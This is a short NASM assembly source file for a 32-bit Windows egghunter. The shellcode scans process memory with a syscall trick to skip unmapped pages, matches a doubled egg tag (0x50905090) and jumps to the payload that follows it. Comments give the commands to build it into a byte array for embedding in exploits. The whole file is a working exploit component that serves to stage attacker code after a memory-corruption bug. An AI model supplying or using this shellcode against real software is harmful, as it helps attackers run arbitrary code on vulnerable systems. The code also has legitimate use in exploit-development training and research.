; egghunter.asm
; nasm egghunter.asm -o egghunter.bin
; xxd -i egghunter.bin

[BITS 32]

loop_inc_page:
    or dx, 0x0fff

loop_inc_one:
    inc edx ; e.x. 0x12340ffff -> 0x12341000

loop_check:
    push edx
    push 0x43

    pop eax
    int 0x2e
    cmp al, 0x05

    pop edx

loop_check_8_valid:
    je loop_inc_page

is_egg:
    mov eax, 0x50905090
    mov edi, edx
    scasd
    jnz loop_inc_one

    scasd

    jnz loop_inc_one

matched:
    jmp edi